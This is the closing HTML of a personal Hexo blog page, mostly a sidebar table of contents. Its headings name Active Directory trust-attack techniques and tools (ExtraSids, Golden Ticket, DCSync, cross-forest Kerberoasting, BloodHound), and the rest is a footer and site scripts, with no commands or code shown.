class="toc-article-link" href="#Domain-Trust"><span class="toc-article-text">Domain Trust</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Domain-Controllers"><span class="toc-article-text">Domain Controllers</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Workstations-and-Servers"><span class="toc-article-text">Workstations and Servers</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#BloodHound-3"><span class="toc-article-text">BloodHound</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Attacking-Domain-Trusts-Child-Parent-Trusts"><span class="toc-article-text">Attacking Domain Trusts - Child -&gt; Parent Trusts</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SID-History"><span class="toc-article-text">SID History</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ExtraSids-Attack-Windows"><span class="toc-article-text">ExtraSids Attack - Windows</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Collect"><span class="toc-article-text">Collect</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Mimikatz-2"><span class="toc-article-text">Mimikatz</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#PowerView-5"><span class="toc-article-text">PowerView</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Golden-Ticket"><span class="toc-article-text">Golden Ticket</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Mimikatz-3"><span class="toc-article-text">Mimikatz</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Rubeus-3"><span class="toc-article-text">Rubeus</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#DCSync-2"><span class="toc-article-text">DCSync</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#mimikatz-1"><span class="toc-article-text">mimikatz</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ExtraSids-Attack-Linux"><span class="toc-article-text">ExtraSids Attack - Linux</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Collect-1"><span class="toc-article-text">Collect</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Impacket-secretsdump-py-1"><span class="toc-article-text">Impacket secretsdump.py</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Impacket-lookupsid-py"><span class="toc-article-text">Impacket lookupsid.py</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Golden-Ticket-1"><span class="toc-article-text">Golden Ticket</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Impacket-ticketer-py"><span class="toc-article-text">Impacket ticketer.py</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Impacket-psexec-py"><span class="toc-article-text">Impacket psexec.py</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Impacket-raiseChild-py"><span class="toc-article-text">Impacket raiseChild.py</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Attacking-Domain-Trusts-Cross-Forest-Trust-Abuse"><span class="toc-article-text">Attacking Domain Trusts - Cross-Forest Trust Abuse</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Cross-Forest-Kerberoasting-Windows"><span class="toc-article-text">Cross-Forest Kerberoasting - Windows</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Enumerating-Accounts-for-Associated-SPNs-PowerView"><span class="toc-article-text">Enumerating Accounts for Associated SPNs -PowerView</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Kerberoasting-Rubeus"><span class="toc-article-text">Kerberoasting - Rubeus</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Cross-Forest-Kerberoasting-Linux"><span class="toc-article-text">Cross-Forest Kerberoasting - Linux</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Impacket-GetUserSPNs-py"><span class="toc-article-text">Impacket GetUserSPNs.py</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Hunting-Foreign-Group-Membership-BloodHound"><span class="toc-article-text">Hunting Foreign Group Membership - BloodHound</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Adding-INLANEFREIGHT-LOCAL-to-etc-resolv-conf"><span class="toc-article-text">Adding INLANEFREIGHT.LOCAL to &#x2F;etc&#x2F;resolv.conf</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#bloodhound-python-Against-INLANEFREIGHT-LOCAL"><span class="toc-article-text">bloodhound-python Against INLANEFREIGHT.LOCAL</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Adding-FREIGHTLOGISTICS-LOCAL-to-etc-resolv-conf"><span class="toc-article-text">Adding FREIGHTLOGISTICS.LOCAL to &#x2F;etc&#x2F;resolv.conf</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#bloodhound-python-Against-FREIGHTLOGISTICS-LOCAL"><span class="toc-article-text">bloodhound-python Against FREIGHTLOGISTICS.LOCAL</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Viewing-Dangerous-Rights-through-BloodHound"><span class="toc-article-text">Viewing Dangerous Rights through BloodHound</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Admin-Password-Re-Use-Group-Membership"><span class="toc-article-text">Admin Password Re-Use &amp; Group Membership</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enum-9"><span class="toc-article-text">enum</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#verify"><span class="toc-article-text">verify</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SID-History-Abuse"><span class="toc-article-text">SID History Abuse</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 n2ryx's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
